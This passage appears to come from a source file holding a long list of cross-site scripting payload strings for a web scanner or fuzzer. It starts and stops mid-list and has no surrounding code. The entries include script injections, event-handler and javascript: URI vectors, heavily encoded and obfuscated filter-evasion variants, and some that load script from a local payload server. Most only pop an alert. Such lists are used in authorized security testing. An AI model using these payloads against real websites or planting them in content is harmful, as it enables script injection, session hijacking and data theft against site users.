             '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/", '</ScrIpt><SCRIPT>a=/X/\\nalert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/',
             "'><SCRIPT>a=/X/", '</ScrIpt><SCRIPT>a=/X/\\nalert(1);</SCRIPT>', '"><SCRIPT>a=/X/',
             '</ScrIpt><SCRIPT>a=/X/', '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/",
             '</ScrIpt><SCRIPT>a=/X/\\nalert(1);</SCRIPT>', '</ScrIpt><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/',
             '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/",
             '</ScrIpt><SCRIPT>a=/X/\\nalert(1);</SCRIPT>', "'><SCRIPT>a=/X/", '</ScrIpt><SCRIPT>a=/X/',
             '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/",
             '</ScrIpt><SCRIPT>a=/X/\\nalert(1);</SCRIPT>', '</ScrIpt><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/',
             '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/",
             '</ScrIpt><SCRIPT>a=/X/\\nalert(1);</SCRIPT>', '<script>alert([!![]]+[])</script>',
             '</ScrIpt><script>alert([!![]]+[])</script>', '"><script>alert([!![]]+[])</script>',
             '</ScrIpt><script>alert([!![]]+[])</script>', "'><script>alert([!![]]+[])</script>",
             '</ScrIpt><script>alert([!![]]+[])</script>', '<script>prompt(-[])</script>',
             '</ScrIpt><script>prompt(-[])</script>', '"><script>prompt(-[])</script>',
             '</ScrIpt><script>prompt(-[])</script>', "'><script>prompt(-[])</script>",
             '</ScrIpt><script>prompt(-[])</script>', '<scr/**/ipt>alert(1)</sc/**/ipt>',
             '"><scr/**/ipt>alert(1)</sc/**/ipt>', "'><scr/**/ipt>alert(1)</sc/**/ipt>", '#<script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>', "\\'><script>X<\\/script>",
             "\\'><body onload=\\'X\\'>", '><script>X<\\/script>', '<body onload="X">', '"><body onload="X">',
             '\'><body onload="X">', '<img src="x:X" onerror="alert(1)">', '"><img src="x:X" onerror="alert(1)">',
             '\'><img src="x:X" onerror="alert(1)">', '<img src=a onerror=alert(1)', '"><img src=a onerror=alert(1)',
             "'><img src=a onerror=alert(1)%0A>a", '"><img src=a onerror=alert(1)%0A>a',
             "'><img src=a onerror=alert(1)%0A>a", 'onmouseover=alert(1);', '<<SCRIPT>alert(1);/',
             '"><<SCRIPT>alert(1);/', "'><<SCRIPT>alert(1);/", '<SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/',
             '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/", '</ScrIpt><SCRIPT>a=/X/', 'alert(1)',
             'alert(String.fromCharCode(49))', 'alert(/1/.source)', "eval('alert(1)')",
             "this['EvAL'.toLowerCase()]('aLErT(1)'.toLowerCase())", '(alert(1)).replace(/.+/,eval);',
             '\\u0061\\u006c\\u0065\\u0072\\u0074(1)', "eval('\\u00' + '6' + '1'+'le' + '\\u0072' + 't(1)')",
             "eval('\\141\\154\\145\\162\\164\\50\\61\\51')", "eval('\\x61\\x6c\\x65\\x72\\x74(1)')",
             "eval('\\x61ler\\x74(1)')", "top['a\\x6Cert'](1)",
             "x='\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29';new Function(x)()", "setTimeout('alert(1)',0)",
             'setTimeout(\\u0061\\u006c\\u0065\\u0072\\u0074(1),0);', "onerror=eval;throw'alert\\x281\\x29';",
             'expression(URL=0)', 'expr\\65 ssion(URL=0)', 'expr\\65 ss/*???*/ion(URL=0);', 'expression\\28URL=0\\29',
             'expr\\65 ss/*\\&#x25;/ion\\28URL=0\\29', '\\000045xpr\\000065 ss/*BlABl/\\\\aaaaa!!!*',
             'feed:javascript:alert(1)', 'feed:javascript&colon;alert(1)',
             'feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e',
             'feed:data:text/html,%3csvg%20onload=alert%281%29%3e', 'data:text/html,%3Cscript%3Ealert(1)%3C/script%3E',
             'd&#x61;t&#x61;&colon;text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
             'data:_;;;:;base64_______,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
             '<LAYER SRC="javascript:alert(1);"></LAYER>', '"><LAYER SRC="javascript:alert(1);"></LAYER>',
             '\'><LAYER SRC="javascript:alert(1);"></LAYER>', '<LINK REL="stylesheet" HREF="javascript:alert(1);">',
             '"><LINK REL="stylesheet" HREF="javascript:alert(1);">',
             '\'><LINK REL="stylesheet" HREF="javascript:alert(1);">', '<!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT><![endif]-->', '"><!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT><![endif]-->', "'><!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT><![endif]-->', '<BASE HREF="javascript:alert(1);//">',
             '"><BASE HREF="javascript:alert(1);//">', '\'><BASE HREF="javascript:alert(1);//">',
             'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
             '<script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '<IFRAME SRC="javascript:alert(1);"></IFRAME>', '"><IFRAME SRC="javascript:alert(1);"></IFRAME>',
             '\'><IFRAME SRC="javascript:alert(1);"></IFRAME>', '<iframe src="javascript:alert(1); <',
             '"><iframe src="javascript:alert(1); <', '\'><iframe src="javascript:alert(1); <',
             '<object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>',
             '"><object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>',
             '\'><object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>',
             '<SCRIPT>x=/X/  alert(x.source)</SCRIPT>', '</ScrIpt><SCRIPT>x=/X/  alert(x.source)</SCRIPT>',
             '"><SCRIPT>x=/X/  alert(x.source)</SCRIPT>', '</ScrIpt><SCRIPT>x=/X/  alert(x.source)</SCRIPT>',
             "'><SCRIPT>x=/X/  alert(x.source)</SCRIPT>", '</ScrIpt><SCRIPT>x=/X/  alert(x.source)</SCRIPT>',
             '<BODY ONLOAD=alert(1)>', '"><BODY ONLOAD=alert(1)>', "'><BODY ONLOAD=alert(1)>",
             '<ScRiPt+>prompt(1)</ScRiPt>', '"><ScRiPt+>prompt(1)</ScRiPt>', "'><ScRiPt+>prompt(1)</ScRiPt>",
             '<img src=X onerror=alert(1)>', '"><img src=X onerror=alert(1)>', "'><img src=X onerror=alert(1)>",
             '<img src=/ onerror=alert(1);>', '"><img src=/ onerror=alert(1);>', "'><img src=/ onerror=alert(1);>",
             '<BODY BACKGROUND="javascript:alert(1)">', '"><BODY BACKGROUND="javascript:alert(1)">',
             '\'><BODY BACKGROUND="javascript:alert(1)">', '<TABLE BACKGROUND="javascript:alert(1)">',
             '"><TABLE BACKGROUND="javascript:alert(1)">', '\'><TABLE BACKGROUND="javascript:alert(1)">',
             "<IMG SRC='vbscript:msgbox(1)'>", '"><IMG SRC=\'vbscript:msgbox(1)\'>', "'><IMG SRC='vbscript:msgbox(1)'>",
             '<ScriPt>ALeRt(? X ?)</scriPt>', '</ScrIpt><ScriPt>ALeRt(? X ?)</scriPt>',
             '"><ScriPt>ALeRt(? X ?)</scriPt>', '</ScrIpt><ScriPt>ALeRt(? X ?)</scriPt>',
             "'><ScriPt>ALeRt(? X ?)</scriPt>", '</ScrIpt><ScriPt>ALeRt(? X ?)</scriPt>',
             '<a href="javascript#alert(1);">', '"><a href="javascript#alert(1);">',
             '\'><a href="javascript#alert(1);">', '<div onmouseover="alert(1);">', '"><div onmouseover="alert(1);">',
             '\'><div onmouseover="alert(1);">', '<BR SIZE="&{alert(1)}">', '"><BR SIZE="&{alert(1)}">',
             '\'><BR SIZE="&{alert(1)}">', '&<script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>',
             '"><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script>', '&{alert(1);};', '<img src=&{alert(1);};>',
             '"><img src=&{alert(1);};>', "'><img src=&{alert(1);};>", '<img src="mocha:alert(1);">',
             '"><img src="mocha:alert(1);">', '\'><img src="mocha:alert(1);">', '<img src="livescript:alert(1);">',
             '"><img src="livescript:alert(1);">', '\'><img src="livescript:alert(1);">',
             '<a href="about:<script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>',
             '"><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script>">', '[\\xC0][\\xBC]script>alert(1);[\\xC0][\\xBC]/script>" };',
             '<object classid="clsid:..." codebase="javascript:alert(1);">',
             '"><object classid="clsid:..." codebase="javascript:alert(1);">',
             '\'><object classid="clsid:..." codebase="javascript:alert(1);">',
             '<style><!--</style><script>alert(1);//--></script>',
             '"><style><!--</style><script>alert(1);//--></script>',
             "'><style><!--</style><script>alert(1);//--></script>", '<![CDATA[<!--]]<script>alert(1);//--></script>',
             '"><![CDATA[<!--]]<script>alert(1);//--></script>', "'><![CDATA[<!--]]<script>alert(1);//--></script>",
             '<!-- -- --><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>',
             '"><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script><!-- -- -->',
             'javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42\'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"',
             '<EMBED SRC="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></EMBED>',
             '"><EMBED SRC="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></EMBED>',
             '\'><EMBED SRC="http://127.0.0.1:3555/xss_serve_payloads/flash.swf"></EMBED>',
             '<img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>',
             '"><img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>',
             '\'><img src="http://127.0.0.1:3555/xss_serve_payloads/image.png" onerror=alert(1)>',
             '<img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>',
             '"><img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>',
             '\'><img src="http://127.0.0.1:3555/xss_serve_payloads/gif.gif" onerror=alert(1)>',
             '<img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>',
             '"><img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>',
             '\'><img src="http://127.0.0.1:3555/xss_serve_payloads/bmp.bmp" onerror=alert(1)>',
             '<img src="http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>',
             '"><img src="http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>',
             '\'><img src="http://127.0.0.1:3555/xss_serve_payloads/jpg.jpg" onerror=alert(1)>',
             '<meta HTTP-EQUIV="REFRESH" content="0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html">',
             '"><meta HTTP-EQUIV="REFRESH" content="0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html">',
             '\'><meta HTTP-EQUIV="REFRESH" content="0; url=http://127.0.0.1:3555/xss_serve_payloads/X.html">',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:image/svg+xml; base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '<BGSOUND SRC="javascript:alert(1);">', '"><BGSOUND SRC="javascript:alert(1);">',
             '\'><BGSOUND SRC="javascript:alert(1);">',
             '<script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/X.html","_self");</script>',
             '"><script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/X.html","_self");</script>',
             '\'><script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/X.html","_self");</script>',
             '<SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT a=">" \'\' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT a=">" \'\' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT a=">" \'\' SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT "a=\'>\'" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT "a=\'>\'" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT "a=\'>\'" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT a=">\'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT a=">\'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT a=">\'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT =">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT a=">" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<SCRIPT a=">" \'\' SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT a=">" \'\' SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT a=">" \'\' SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<SCRIPT "a=\'>\'" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT "a=\'>\'" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT "a=\'>\'" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT a=`>` SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<SCRIPT a=">\'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT a=">\'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT a=">\'>" SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '<TABLE><TD BACKGROUND="javascript:alert(1)">', '"><TABLE><TD BACKGROUND="javascript:alert(1)">',
             '\'><TABLE><TD BACKGROUND="javascript:alert(1)">',
             '<img src=\'http://127.0.0.1:3555/xss_serve_payloads/gif.gif\' onload=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"\'>',
             '"><img src=\'http://127.0.0.1:3555/xss_serve_payloads/gif.gif\' onload=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"\'>',
             '\'><img src=\'http://127.0.0.1:3555/xss_serve_payloads/gif.gif\' onload=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"\'>',
             '<img src=\'http://127.0.0.1:3555/xss_serve_payloads/gif.gif\' onload=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"\'>',
             '"><img src=\'http://127.0.0.1:3555/xss_serve_payloads/gif.gif\' onload=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"\'>',
             '\'><img src=\'http://127.0.0.1:3555/xss_serve_payloads/gif.gif\' onload=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"\'>',
             '<img src=\'http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif\' onerror=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"\'>',
             '"><img src=\'http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif\' onerror=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"\'>',
             '\'><img src=\'http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif\' onerror=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/X.js"\'>',
             '<img src=\'http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif\' onerror=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"\'>',
             '"><img src=\'http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif\' onerror=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"\'>',
             '\'><img src=\'http://127.0.0.1:3555/xss_serve_payloads/xxxgif.gif\' onerror=\'document.scripts(0).src="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"\'>',
             "<img src='http://127.0.0.1:3555/xss_serve_payloads/X.html' onload=alert(1)//></img>",
             '"><img src=\'http://127.0.0.1:3555/xss_serve_payloads/X.html\' onload=alert(1)//></img>',
             "'><img src='http://127.0.0.1:3555/xss_serve_payloads/X.html' onload=alert(1)//></img>",
             '<script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>',
             '</ScrIpt><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>',
             '"><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>',
             '</ScrIpt><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>',
             "'><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>",
             '</ScrIpt><script>alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])</script>',
             '<img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
             '"><img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
             "'><img src=&#106;&#97;&#118;&#97;&#115;&#99; &#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101; &#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
             '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69 &#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27 &#x58&#x53&#x53&#x27&#x29>',
             '"><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69 &#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27 &#x58&#x53&#x53&#x27&#x29>',
             "'><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69 &#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27 &#x58&#x53&#x53&#x27&#x29>",
             '<img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>',
             '"><img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>',
             "'><img src=&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112 &#0000116&#0000058&#0000097&#0000108&#0000101 &#0000114&#0000116&#0000040&#0000039&#0000088 &#0000083&#0000083&#0000039&#0000041>",
             '?><script>prompt(1)</script>', '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '?><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>', '?><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '?><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>', '<ScRIPt>prompt(1)</ScRIPt>',
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', '"><ScRIPt>prompt(1)</ScRIPt>',
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', "'><ScRIPt>prompt(1)</ScRIPt>",
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', '<ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>',
             '"><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>',
             "'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>", '?><ScRIPt>prompt(1)</ScRIPt>',
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', '"><ScRIPt>prompt(1)</ScRIPt>',
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', "'><ScRIPt>prompt(1)</ScRIPt>",
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', '?><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>',
             '"><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>',
             "'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>", '?><ScRIPt>prompt(1)</ScRIPt>',
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', '"><ScRIPt>prompt(1)</ScRIPt>',
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', "'><ScRIPt>prompt(1)</ScRIPt>",
             '</ScrIpt><ScRIPt>prompt(1)</ScRIPt>', '?><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>',
             '"><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>',
             "'><ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>", '</script><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '"></script><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', "'></script><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '</script><script>alert(String.fromCharCode(75,67,70))</script>',
             '"></script><script>alert(String.fromCharCode(75,67,70))</script>',
             "'></script><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>', '?/><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
